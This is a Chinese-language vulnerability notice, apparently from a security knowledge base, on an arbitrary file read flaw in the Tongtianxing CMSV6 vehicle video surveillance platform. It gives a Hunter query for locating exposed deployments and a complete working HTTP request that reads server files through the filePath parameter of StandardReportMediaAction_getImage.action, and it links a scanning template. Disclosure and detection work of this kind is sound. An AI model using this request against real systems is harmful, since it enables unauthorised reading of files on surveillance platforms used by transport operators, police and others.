# 通天星CMSV6车载视频监控平台 StandardReportMediaAction_getImage存在任意文件读取漏洞

# 一、漏洞简介
通天星CMSV6车载视频监控平台是东莞市通天星软件科技有限公司研发的监控平台，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。通天星科技应用于公交车车载、校车车载、大巴车车载、物流车载、油品运输车载、警车车载等公共交通视频监控，还应用在家居看护、商铺远程监控、私家车的行驶分享仪上等。通天星CMSV6车载视频监控平台 StandardReportMediaAction_getImage存在信息泄露漏洞。

# 二、影响版本
+ 通天星CMSV6车载视频监控平台

# 三、资产测绘
+ hunter`web.body="./open/webApi.html"`
+ 特征

![1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4.png](./img/Qz7AF5mVWHbgfj7L/1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4-213540.png)

# 四、漏洞复现
```plain
GET /808gps/StandardReportMediaAction_getImage.action?filePath=C://Windows//win.ini&fileOffset=1&fileSize=100 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=82D471F9BEF54995F73170C5647FAF54
Upgrade-Insecure-Requests: 1
```

![1708916552974-e0e3aa2a-cfee-488d-9cff-878b9b5c550f.png](./img/Qz7AF5mVWHbgfj7L/1708916552974-e0e3aa2a-cfee-488d-9cff-878b9b5c550f-986675.png)[通天星-CMSV6-standardreportmediaaction-getimage-文件读取.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/29512878/1735362336433-896c3fbf-7ba6-4420-8882-397fee7aa98b.yaml)



> 更新: 2024-12-28 13:05:36  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bt8a7sowdhsh0dc6>